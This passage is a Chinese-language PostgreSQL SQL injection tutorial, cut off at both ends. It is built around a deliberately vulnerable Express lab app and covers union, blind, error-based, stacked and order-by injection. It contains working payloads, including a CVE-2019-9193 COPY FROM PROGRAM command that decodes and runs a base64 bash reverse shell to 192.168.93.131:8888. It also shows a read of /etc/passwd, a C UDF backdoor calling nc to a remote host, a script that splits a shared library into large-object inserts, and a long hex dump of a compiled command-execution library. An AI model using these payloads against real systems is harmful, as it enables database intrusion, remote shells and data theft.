by语句，通过拼接数字，可确定字段数量，若大于，则页面错误/无内容，若小于/等于，则页面正常，若错误页面与正确页面一致，更换盲注或报错注入。 select * from table_name from column_name = 'xxx' order by 3 正常页面 错误页面 所以这里确定该表字段数为3 确定页面回显位 在这里知道了字段数为3，那么就要判断回显位了，使用union select '1','2','3'将定义的数字显示在页面上，就可以判断页面的回显位了 注意： 若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面现在了单行数据输出，我们让前边的select查询条件返回结果为空即可 注意一定要拼接够足够的字段数，否则SQL语句报错。PS：此方法也可作为判断前条select语句的方法之一 如果union前面的查询条件返回为空的情况下，也没有标记数字，这时候一般是类型出错，导致无法显示在页面，可以将数字更改未null，如下所示 查询数据 通过前面2步，确定了字段数量以及页面回显位，首先就需要探测相关环境，如下所示： 探测版本 select version(); 探测当前用户 select user; 探测数据库/模式相关 -- 获取当前数据库 select current_database(); -- 获取当前数据库模式/也就是存表的地方 select current_schema; -- 获取所有的数据库 select datname from pg_database; -- 获取当前数据库下所有的模式 select distinct schemaname from pg_tables; -- string_agg(字段,分隔符) 实现group_concat select string_agg(datname,',') from pg_database; -- array_to_string(array_agg(字段，分隔符)) select array_to_string(array_agg(datname),',') from pg_database; 获取当前数据库public模式下的表名 select tablename from pg_tables where schemaname = 'public' -- 或者从该库的information_schema.tables获取 select table_name from information_schema.tables where table_schema='public' 获取products表里的列名 SELECT attname FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND a.relname='products' AND nspname='public'; select column_name from information_schema.columns where table_name = 'products'; 获取值 select name from products 盲注 布尔盲注 postgresql 布尔盲注和其他数据库盲注一样，通过页面对带入数据库永真/假条件返回的内容差异，从而判断是否可以进行布尔盲注。通常页面返回存在/不存在两个结果，就可以判断是否存在布尔注入了。 布尔盲注流程 1. 判断注入点 2. 求解数据库 a. 判断用户/当前数据库长度 b. 依次求解用户/当前数据库长度 3. 求当前数据库表 a. 判断当前数据库表的个数 b. 猜解第一个表的长度 c. 猜解表的字符串/ascii码值 d. 依次求解，直到找到所有的表 4. 求某表的列名 a. 判断该表列名的个数 b. 猜解第一个列名的长度 c. 猜解第一个列名的字符串/ascii码值 d. 依次求解，直到该表中找到所有的列名 5. 求某表的值 a. 判断字段的个数 b. 猜解第一个字段的长度 c. 猜解第一个字段的字符串/ascii码值 d. 依次求解，直到查询完表中所有的值 布尔盲注判断注入点 and 1=1 恒真 and 1=2 恒假 利用这一特性，我们可以构造payload 通过来页面显示情况来获取数据库数据 布尔盲注常用函数 ascii() substring()/substr() length() 布尔盲注手法 获取当前数据库的用户名 ascii('p') = 112 select * from xxx_table where xxx = 'xxx' and ascii(substring((select user),1,1)) = 112 依次对字符串求解，当截取到最后一位（+1）时会substring/substr()函数会返回空字符串，ascii对空处理会变成0 所以当第9位为0成立，那么字符串长度为9-1=8位 获取所有的数据库/模式 --postgresql limit用法只能使用limit xx offset xx select datname from pg_database limit 1 offset 0; 判断数据库个数 select * from xxx_table where xxx = 'xxx' and 3=(select count(datname) from pg_database limit 1 offset 0) 判断第一个数据库名的长度 select * from xxx_table where xxx = 'xxx' and (select length(datname) from pg_database limit 1 offset 0) = 8 判断第一个数据库的字符 select * from xxx_table where xxx = 'xxx' and ascii(substring((select datname from pg_database limit 1 offset 0),1,1)) = 112 依次猜解，可获取库/模式的名称，limit 语法固定使用limit xxx offset xxx来写 获取当前数据库的表 当前数据库为postgres，schema为public -- 首先获取当前数据库、模式下存在多少表 select count(tablename) from pg_tables where schemaname = 'public' select count(table_name) from information_schema.tables where table_schema='public' -- 然后获取当前数据库，模式下某表的长度 select length(tablename) from pg_tables where schemaname = 'public' limit 1 offset 0 select length(table_name) from information_schema.tables where table_schema='public' limit 1 offset 0 -- 猜解表名 select ascii(substring(tablename,1,1)) from pg_tables where schemaname = 'public' limit 1 offset 0 select ascii(substring(table_name,1,1)) from information_schema.tables where table_schema = 'public' limit 1 offset 0 获取当前表的字段名 -- 首先获取当前字段的个数 SELECT count(attname) FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND a.relname='products' AND nspname='public'; select count(column_name) from information_schema.columns where table_name = 'products'; -- 获取列名长度 SELECT length(attname) FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND a.relname='products' AND nspname='public' limit 1 offset 0 select length(column_name) from information_schema.columns where table_name = 'products' limit 1 offset 0; -- 获取列名值 SELECT ascii(substr(attname,1,1)) FROM pg_namespace,pg_type,pg_attribute b JOIN pg_class a ON a.oid=b.attrelid WHERE a.relnamespace=pg_namespace.oid AND pg_type.oid=b.atttypid AND attnum>0 AND a.relname='products' AND nspname='public' limit 1 offset 0; select ascii(substr(column_name,1,1)) from information_schema.columns where table_name = 'products' limit 1 offset 0; 获取值 select count(id) from products; select length(name) from products limit 1 offset 0; select ascii(substr(name),1,1) from products limit 1 offset 0; 时间盲注 常用函数/表达式 pg_sleep() case when(expr1) then result1 else result2 end pg_sleep_for(interval) -- 9.4及之后版本新增 select pg_sleep_for('5 sec') pg_sleep_until(timestamp with time zone) ```sql -- 9.4及之后版本新增 postgres=# select now(); 2021-10-08 10:23:54.427797+00 postgres=# select pg_sleep_until('2021-10-08 10:25:20'); postgres=# postgresql 时间盲注和其他数据库时间盲注类似，由于postgresql默认支持堆叠查询，首先在判断数据库时可以利用postgresql特有的pg_sleep()函数来快速判断是否是postgresql #### 堆叠查询判断数据库 ![image.png](./Postgresql 注入基础.assets/2023_05_19_10_40_12_E5mrOzFK.png) #### 时间盲注示例 同布尔盲注流程一致，在case...when...then...else...end表达式内构造条件判断语句，如果正确执行pg_sleep(),否则不做任何操作，通过延时来获取数据 ```sql select case when(ascii(substr((select datname from pg_database limit 1 offset 0),1,1))>97) then (select 1 from pg_sleep(5)) else 1 end when中的表达式主要用于判断True或者False，同布尔盲注的判断条件 报错注入 由于没有找到免费的在线环境，在这里我使用node.js+express快速搭建了一个web靶场，用于测试postgresql的报错注入，环境依赖node.js+postgresql，报错注入在postgresql其实不太常见，由于postgresql默认支持堆叠查询，所以通常使用堆叠查询就直接getshell了 # 拉取postgresql 官方镜像 sudo docker pull postgres sudo docker run -p 5432:5432 --name postgres -e POSTGRES_PASSWORD=123456 -d postgres # node 启动web node app.js 相关代码如下： const express = require('express') const app = new express app.get('/errorbase', (req, res) => { const obj = { data: [], sql: '' } try { const pg = require('pg') var config = { host:'192.168.93.131', user: 'postgres', database: 'postgres', password: '', port: 5432 } const pool = new pg.Pool(config) let id = req.query.id let sql = `select * from users where id = '${id}'` obj.sql = sql pool.connect((err, result) => { }) pool.query(sql, (err, result) => { try { if (err) { throw new Error(err) } else { obj.data = result.rows res.send(obj) } } catch (e) { obj.data = ''+e res.send(obj) } }) } catch (e) { console.log(e) } }) app.listen(8080,() => { console.log('running!') }) 结果如下： CAST 原理：类型转化报错 payload AND 1=CAST((SELECT version()) AS int) 获取数据库版本 select * from users where id = '1' and cast((select version()) as int)=1 获取数据库用户 select * from users where id = '1' and cast((select user) as int)=1 获取数据库/模式 select * from users where id = '1' and cast((SELECT string_agg(datname,',')from pg_database) as int)=1 select * from users where id = '1' and cast((SELECT string_agg(distinct schemaname,',')from pg_tables) as int)=1 获取当前数据库下public的表 select * from users where id = '1' and cast((SELECT string_agg(tablename,',') from pg_tables where schemaname='public') as int)=1 获取users表的列名 select * from users where id = '1' and cast((SELECT string_agg(column_name,',') from information_schema.columns where table_name='users') as int)=1 获取值 select * from users where id = '1' AND 7778=CAST((SELECT string_agg(username,',') from users)::text AS NUMERIC) ::运算符 原理：用于值或字段之后，效果同 cast，但在语法上简便许多，在需要进行多次转换进行报错的时候无疑是很方便的 select '1'::text::int 获取当前用户 select * from users where id = '1' and (select user::int)=1 通过报错注入获取其他数据同cast方式一样，修改核心查询语句即可 堆叠注入 postgresql和mssql一样，默认支持多语句，闭合前语句，再使用;分隔前后的语句，以达到堆叠查询的目的。 由于堆叠查询的特殊性，也可以利用postgresql的特殊函数pg_sleep()快速判断是否是postgresql payload ?id=1';select pg_sleep(5)-- 在判断出注入点以及是postgresql且可堆叠查询的情况下，可以使用CVE-2019-9193，执行任意命令，反弹shell，从版本9.3开始，Postgres新增了一个“COPY TO/FROM PROGRAM”功能。这个功能简单来说就是允许数据库的超级用户以及pg_read_server_files组中的任何用户执行操作系统命令 --完整sql语句 DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); -- YmFzaCAtaSA+IC9kZXYvdGNwLzE5Mi4xNjguOTMuMTMxLzg4ODggMD4mMQ== 是 bash -i ./dev/tcp/192.168.93.131/8888 0>&1 COPY cmd_exec FROM PROGRAM 'echo YmFzaCAtaSA+IC9kZXYvdGNwLzE5Mi4xNjguOTMuMTMxLzg4ODggMD4mMQ==|base64 -d|bash'; -- 反弹shell这一步可以不用 select * from cmd_exec; 在web中由于+号会被认为是空格，就会导致字符串被拆解，无法利用，需要对+号进行一次url编码，完整payload如下 ?id=1';DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM 'echo YmFzaCAtaSA%2bIC9kZXYvdGNwLzE5Mi4xNjguOTMuMTMxLzg4ODggMD4mMQ==|base64 -d|bash';-- Order by 注入 order by 注入通常出现在排序中，前端展示的表格，某一列需要进行升序或者降序排列，或者做排名比较的时候常常会用到order by排序，order by在select语句中，紧跟在where [where condition]后，且order by 注入无法使用预编译来防御，由于order by 后面需要紧跟column_name，而预编译是参数化字符串，而order by后面紧跟字符串就会提示语法错误，通常防御order by 注入需要使用白名单的方式。 通过order by 列名，根据排序返回的情况来判断是否存在，或者使用超大数，构成SQL语句错误 这里我对代码中的sql语句修改一下，如下所示： let sort = req.query.sort if (sort === undefined) { sort = 'id' } let sql = `select * from users order by ${sort}` postgresql 的order by注入，涉及条件相当复杂，由于postgresql order by后面要紧跟true，或者false，需要使用case...when...then...else...end表达式嵌套SELECT和CASE WHEN语句，直到可以将\"布尔盲注成功利用，然后睡眠5秒\"转换为\"true或false\" select case when((select case when(select user = 'postgres') then (select true from PG_SLEEP(5)) else false end)) then true else false end select case when(select user = 'postgres') then (select 1 from pg_sleep(2)) else 1 end 如果开启了报错回显，那么可以利用报错注入获取信息 二次注入 场景见MySQL注入基础二次注入 HTTP头部注入 见MySQL注入基础HTTP头部注入 文件读/写 文件读写在postgresql中比较方便利用，网上有一些函数( pg_logdir_ls()、pg_ls_dir()、pg_file_rename()、pg_file_write()、 pg_read_file()、pg_length_file())读取/写入，但是又有限制，有的函数也没有，所以以下的方法是肯定能利用的 读 创建数据表将读到的文件copy入表 drop table if exists test; CREATE TABLE test(t TEXT); COPY test FROM '/etc/passwd'; SELECT * FROM test limit; 写 copy 命令写入 COPY (select '') to '/tmp/1.php'; 命令执行 以下是摘抄自渗透中利用postgresql getshell的，暂未复现 低版本的命令执行 可以直接调用/lib/libc.so.6或者是/lib64/libc.so.6 一般8.2以下的版本可以 CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE C STRICT; CREATE FUNCTION system(cstring) RcETURNS int AS '/lib64/libc.so.6', 'system' LANGUAGE C STRICT; 直接可以执行 select system('id'); 高版本的命令执行 CVE-2019-9193 见堆叠注 其他 当postgresql版本高于8.2存在安全机制无法调用系统libc.so.6所以需要自己利用UDF进行命令执行 ERROR: incompatible library \"xxx.so\": missing magic block HINT: Extension libraries are required to use the PG_MODULE_MAGIC macro 第一步可以先查看postgresql支持的扩展语言: select * from pg_language; 如果支持python perl就很简单和低版本一样直接创建调用详情可参考以下文章: http://static.hx99.net/static/drops/tips-6449.html 当不存在其他扩展语言时,postgresql默认支持C,所以要自己传一个编译好的so库去创建可执行命令函数.这里可以使用简短的反弹shell后门 编译反弹shell后门 #include \"postgres.h\" #include \"fmgr.h\" #include #ifdef PG_MODULE_MAGIC PG_MODULE_MAGIC; #endif text *exec() { system(\"nc -./bin/bash vpsIPaddress 2333\"); } 编译环境需要在/usr/pgsql-9.6/include/server/目录下执行应为存在postgres.h头部调用的库 gcc hack.c -I`pg_config --includedir-server` -fPIC -shared -o udf.so strip -sx udf.so #缩减so文件大小 将文件hex后去除\\n cat udf.so | xxd -ps | tr -d \"\\n\" 接下来我们需要将udf.so文件分割成每2048字节的块,最后一个块的大小不满足2048字节不需要考虑. 为什么不能小于2048?是因为在postgresql高版本处理中,如果块之间小于2048,默认会用0去填充让块达到2048字节所以上传的文件才会一直创建函数失败. 用python脚本去分割udf.so文件,2个16进制数是一个字节所以按照4096个16进制数分割： #~/usr/bin/env python 2.7 #-*- coding:utf-8 -*- import sys from random import randint number = randint(1000, 9999) if __name__ == \"__main__\": if len(sys.argv) != 2: print \"Usage:python \" + sys.argv[0] + \"inputfile\" sys.exit() fileobj = open(sys.argv[1],'rb') i = 0 t = -1 s = '' for b in fileobj.read(): i = i + 1 s += b if i % 4096 == 0: t = t + 1 print 'insert into pg_largeobject values ({number}, {block}, decode(\\'{payload}\\',\\'hex\\'));\\n'\\ .format(number=number, block=t, payload=s) s = '' fileobj.close() 分割完成后按照下文中的sql语句执行： 1.写入对象 2.创建文件 3.建立函数 4.执行命令 5.清理函数 如果不能反弹shell也可以使用sqlmap提供的UDF命令执行的函数： https://github.com/sqlmapproject/udfhack/blob/master/linux/lib_postgresqludf_sys/lib_postgresqludf_sys.c 这里我直接给出hex分片过sql语句直接写入即可创建成功（9.6版本测试有效，如果目标是更加新的版本需要对应安装postgresql-dev扩展包编译代码） SELECT lo_create(9023); insert into pg_largeobject values (9023, 0, decode('7f454c4602010100000000000000000003003e0001000000000d0000000000004000000000000000e8210000000000000000000040003800070040001a00190001000000050000000000000000000000000000000000000000000000000000004c140000000000004c1400000000000000002000000000000100000006000000f81d000000000000f81d200000000000f81d200000000000d802000000000000e00200000000000000002000000000000200000006000000181e000000000000181e200000000000181e200000000000c001000000000000c00100000000000008000000000000000400000004000000c801000000000000c801000000000000c80100000000000024000000000000002400000000000000040000000000000050e5746404000000cc11000000000000cc11000000000000cc110000000000006c000000000000006c00000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000f81d000000000000f81d200000000000f81d200000000000080200000000000008020000000000000100000000000000040000001400000003000000474e550052705bc9352a28aa252e8edf0fbc5d4c32e634e800000000030000001a00000002000000070000008440030810890c99880c008dc84400001a0000002100000026000000325e541ea868be124245d5ec2e67541eaa5fbe12bae3927c5f4de3214aad229d32a1f45bd871581cb88df10e25681b32c60da6d4ead3ef0e6637d3ed339268fe000000000000000000000000000000000000000000000000000000000000000003000900580b0000000000000000000000000000de00000012000000000000000000000000000000000000000901000012000000000000000000000000000000000000001c00000020000000000000000000000000000000000000007601000012000000000000000000000000000000000000006f01000012000000000000000000000000000000000000003a0100001200000000000000000000000000000000000000d60000001200000000000000000000000000000000000000110100001200000000000000000000000000000000000000fb0000001200000000000000000000000000000000000000690100001200000000000000000000000000000000000000010000002000000000000000000000000000000000000000c500000010000000000000000000000000000000000000009800000012000000000000000000000000000000000000006301000012000000000000000000000000000000000000000101000012000000000000000000000000000000000000003f0100001200000000000000000000000000000000000000f500000012000000000000000000000000000000000000005d0100001200000000000000000000000000000000000000320100001200000000000000000000000000000000000000610000002000000000000000000000000000000000000000380000002000000000000000000000000000000000000000520000002200000000000000000000000000000000000000dd00000010000000000000000000000000000000000000002d0100001200000000000000000000000000000000000000e300000012000b00d20e0000000000000800000000000000bc00000012000b00850e0000000000004d000000000000008601000010001600d0202000000000000000000000000000b300000012000b007d0e0000000000000800000000000000ec00000012000b00da0e000000000000c3000000000000009901000010001700d82020000000000000000000000000005001000012000b003b1000000000000031010000000000001801000012000b009d0f00000000000008000000000000008300000012000b00ed0d00000000000030000000000000008d01000010001700d02020000000000000000000000000001000000012000900580b00000000000000000000000000002101000012000b00a50f0000000000008e000000000000007500000012000b00e50d00000000000008000000000000001600000012000c006c1100000000000000000000000000004701000012000b00331000000000000008000000000000009f00000012000b001d0e0000000000006000000000000000005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c61737365730050675f6d616769635f66756e6300746578745f7074725f746f5f636861725f707472006d616c6c6f63006368725f7074725f746f5f746578745f7074720070675f66696e666f5f7379735f657865630070675f6465746f6173745f646174756d0073797374656d0070667265650070675f66696e666f5f7379735f6576616c00706f70656e006667657473007265616c6c6f63007374726e6370790070636c6f73650070675f66696e666f5f7379735f62696e6576616c00666f726b00737973636f6e66006d6d617000776169747069640070675f66696e666f5f7379735f66696c657265616400666f70656e00667365656b006674656c6c0066636c6f7365006672656164006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e3500000000000200', 'hex')); insert into pg_largeobject values (9023, 1, decode('0200000002000200020002000200020002000000000002000200020002000200020002000000000002000000020001000100010001000100010001000100010001000100010001000100010001000000010001007c0100001000000000000000751a6909000002009e01000000000000f81d2000000000000800000000000000b00d000000000000001e2000000000000800000000000000700d000000000000101e2000000000000800000000000000101e200000000000d81f20000000000006000000040000000000000000000000e01f200000000000060000000c0000000000000000000000e81f20000000000006000000150000000000000000000000f01f20000000000006000000160000000000000000000000f81f200000000000060000001700000000000000000000001820200000000000070000000200000000000000000000002020200000000000070000000300000000000000000000002820200000000000070000000500000000000000000000003020200000000000070000000600000000000000000000003820200000000000070000000700000000000000000000004020200000000000070000000800000000000000000000004820200000000000070000000900000000000000000000005020200000000000070000000a00000000000000000000005820200000000000070000002200000000000000000000006020200000000000070000000b00000000000000000000006820200000000000070000000c00000000000000000000007020200000000000070000000d00000000000000000000007820200000000000070000000e00000000000000000000008020200000000000070000000f0000000000000000000000882020000000000007000000100000000000000000000000902020000000000007000000110000000000000000000000982020000000000007000000120000000000000000000000a02020000000000007000000130000000000000000000000a82020000000000007000000140000000000000000000000b02020000000000007000000170000000000000000000000b82020000000000007000000180000000000000000000000c02020000000000007000000190000000000000000000000c820200000000000070000002900000000000000000000004883ec08488b057d1420004885c07405e8c30000004883c408c30000000000000000000000000000ff3582142000ff25841420000f1f4000ff25821420006800000000e9e0ffffffff257a1420006801000000e9d0ffffffff25721420006802000000e9c0ffffffff256a1420006803000000e9b0ffffffff25621420006804000000e9a0ffffffff255a1420006805000000e990ffffffff25521420006806000000e980ffffffff254a1420006807000000e970ffffffff25421420006808000000e960ffffffff253a1420006809000000e950ffffffff2532142000680a000000e940ffffffff252a142000680b000000e930ffffffff2522142000680c000000e920ffffffff251a142000680d000000e910ffffffff2512142000680e000000e900ffffffff250a142000680f000000e9f0feffffff25021420006810000000e9e0feffffff25fa1320006811000000e9d0feffffff25f21320006812000000e9c0feffffff25ea1320006813000000e9b0feffffff25e21320006814000000e9a0feffffff25da1320006815000000e990feffffff25d21320006816000000e980feffff488d05d0132000488d3dc2132000554829f84889e54883f80e77025dc3488b05b41220004885c074f25dffe00f1f4000488d0599132000488d3d92132000554829f84889e548c1f8034889c248c1ea3f4801d048d1f875025dc3488b158f1220004885d274f25d4889c6ffe20f1f4000803d5913200000752748833d7712200000554889e5740c488d3d82102000e82dffffffe868ffffff5dc6053013200001f3c30f1f4000662e0f1f84000000000048833d50102000007426488b05271220004885c0741a55488d3d3a1020004889e5ffd05de957ffffff0f1f8000000000e94bffffff488d05c4030000c355534889fb508b17c1ea028d6afc8d7d014863ffe84afeffff4863d5488d73044889c74889d1f3a4c60410005a5b5dc341544983ccff4c89e15531ed4088e8534889fbf2ae48f7d1488d7903e812feffff4889df4889c24c89e14088e84889def2ae4889df48f7d18d048d0c0000004c89e189024088e8f2ae488d420448f7d14c01e14889c74889d0f3a45b5d415cc3488d0528030000c341554154554889fd5351488b7f20e8a8fdffff4889c74889c3e86dfdffff4989c44889c7e832fdffff4c89e74189c5e8d7fcffff483b5d2074084889dfe809feffff5a5b5d415c4489e8415dc3488d05cf020000c34157415641554154555352488b7f20e852fdffff4889c7e81afdffffbf000400004889c5e84dfdffffbf010000004989c4e840fdffff488d35690200004889efc600004889c331ede869fdffff4989c54c89eabe080000004c89e7e8c6fcffff4885c0743931c04c89e74883c9fff2ae4889df48f7d14c8d71ff468d7c35004963f7e80ffdffff488d3c284963d64c89e64889c34963efe82afcffffebb24c89efe870fcffff803b007405c6442bff00584889df5b5d415c415d415e415fe953fdffff488d0500020000c341545553488b7f20e88efcffff4989c48b28e824fdffff85c07907b801000000eb677555c1ed02bf1e000000e8dafcffff83ed04488d70ff4531c94863ed4531c031ff488d042e48f7d6b921000000ba070000004821c6e8cffbff', 'hex')); insert into pg_largeobject values (9023, 2, decode('ff4883f8ff4889c374b6498d7424044889ea4889c7e886fbffffffd3eb0eba0100000031f689c7e854fcffff31c05b5d415cc3488d0566010000c341574989ff41564155415455534883ec28488b7f20e8ebfbffff488d7c240f488d3524010000b911000000f3a44889c7e8a0fbffff488d350b0100004889c74989c4e81efcffff4885c04889c3744431f6ba020000004889c7e8c7fbffff4889dfe87ffbffff31d231f64889c54889df4189c5e8adfbffff8d7d014863ffe892fbffff4885c04989c675144889dfe8f2faffff41c6471c0131c0e9830000004889d9ba010000004863f54889c7e8c3faffff4889dfe8cbfaffff8d7c2d014863ffe84ffbffff31d24889c34139d58d04127e23418a041688c183e00fc0e9048a44040f83e10f8a4c0c0f88445301880c5348ffc2ebd548984889dfc6040300e8b1fbffff4889df4889c5e846faffff4c89f7e83efaffff4c89e7e836faffff4889e84883c4285b5d415c415d415e415fc34883ec084883c408c300000000000000000000007200726200303132333435363738394142434445460000000000000000000000010000000100000001000000010000001c0000008a0300006400000020000000400000000100000001000000011b033b680000000c000000b4f9ffff8400000019fcffffac00000021fcffffc400000051fcffffec000000b1fcffff1c010000b9fcffff3401000006fdffff6c0100000efdffff84010000d1fdffffcc010000d9fdffffe401000067feffff140200006ffeffff2c0200001400000000000000017a5200017810011b0c070890010000240000001c00000028f9ffff80010000000e10460e184a0f0b770880003f1a3b2a33242200000000140000004400000065fbffff080000000000000000000000240000005c00000055fbffff3000000000410e108602410e188303440e20670e18410e10410e08002c000000840000005dfbffff6000000000420e108c02480e188603460e208304024c0e18410e10420e0800000000000014000000b40000008dfbffff08000000000000000000000034000000cc0000007dfbffff4d00000000420e108d02420e188c03410e208604440e288305410e30790e28410e20410e18420e10450e0800140000000401000092fbffff080000000000000000000000440000001c01000082fbffffc300000000420e108f02420e188e03420e208d04420e288c05410e308606410e388307410e4002a60e38440e30410e28420e20420e18420e10420e081400000064010000fdfbffff0800000000000000000000002c0000007c010000edfbffff8e00000000420e108c02410e188603410e20830402860e18410e10420e0800000000000014000000ac0100004bfcffff0800000000000000000000004c000000c40100003bfcffff3101000000420e108f02450e188e03420e208d04420e288c05410e308606410e388307440e600315010e38410e30410e28420e20420e18420e10420e080000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000', 'hex')); insert into pg_largeobject values (9023, 3, decode('00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b00d000000000000700d0000000000000000000000000000101e20000000000001000000000000007c010000000000000c00000000000000580b0000000000000d000000000000006c110000000000001900000000000000f81d2000000000001b0000000000000008000000000000001a00000000000000001e2000000000001c000000000000000800000000000000f5feff6f00000000f00100000000000005000000000000005006000000000000060000000000000060020000000000000a00000000000000aa010000000000000b00000000000000180000000000000003000000000000000020200000000000020000000000000028020000000000001400000000000000070000000000000017000000000000003009000000000000070000000000000070080000000000000800000000000000c00000000000000009000000000000001800000000000000feffff6f000000005008000000000000ffffff6f000000000100000000000000f0ffff6f00000000fa07000000000000f9ffff6f000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000', 'hex')); insert into pg_largeobject values (9023, 4, decode('181e20000000000000000000000000000000000000000000960b000000000000a60b000000000000b60b000000000000c60b000000000000d60b000000000000e60b000000000000f60b000000000000060c000000000000160c000000000000260c000000000000360c000000000000460c000000000000560c000000000000660c000000000000760c000000000000860c000000000000960c000000000000a60c000000000000b60c000000000000c60c000000000000d60c000000000000e60c000000000000f60c0000000000004743433a2028474e552920342e382e3520323031353036323320285265642048617420342e382e352d31362900002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e646174612e72656c2e726f002e64796e616d6963002e676f74002e676f742e706c74002e627373002e636f6d6d656e74000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b000000070000000200000000000000c801000000000000c80100000000000024000000000000000000000000000000040000000000000000000000000000001e000000f6ffff6f0200000000000000f001000000000000f0010000000000006c00000000000000030000000000000008000000000000000000000000000000280000000b000000020000000000000060020000000000006002000000000000f0030000000000000400000002000000080000000000000018000000000000003000000003000000020000000000000050060000000000005006000000000000aa0100000000000000000000000000000100000000000000000000000000000038000000ffffff6f0200000000000000fa07000000000000fa07000000000000540000000000000003000000000000000200000000000000020000000000000045000000feffff6f02000000000000005008000000000000500800000000000020000000000000000400000001000000080000000000000000000000000000005400000004000000020000000000000070080000000000007008000000000000c0000000000000000300000000000000080000000000000018000000000000005e000000040000004200000000000000300900000000000030090000000000002802000000000000030000000a0000000800000000000000180000000000000068000000010000000600000000000000580b000000000000580b0000000000001a0000000000000000000000000000000400000000000000000000000000000063000000010000000600000000000000800b000000000000800b00000000000080010000000000000000000000000000100000000000000010000000000000006e000000010000000600000000000000000d000000000000000d0000000000006c04000000000000000000000000000010000000000000000000000000000000740000000100000006000000000000006c110000000000006c1100000000000009000000000000000000000000000000040000000000000000000000000000007a000000010000000200000000000000801100000000000080110000000000004c0000000000000000000000000000001000000000000000000000000000000082000000010000000200000000000000cc11000000000000cc110000000000006c00000000000000000000000000000004000000000000000000000000000000900000000100000002000000000000003812000000000000381200000000000014020000000000000000000000000000080000000000000000000000000000009a0000000e0000000300000000000000f81d200000000000f81d0000000000000800000000000000000000000000000008000000000000000000000000000000a6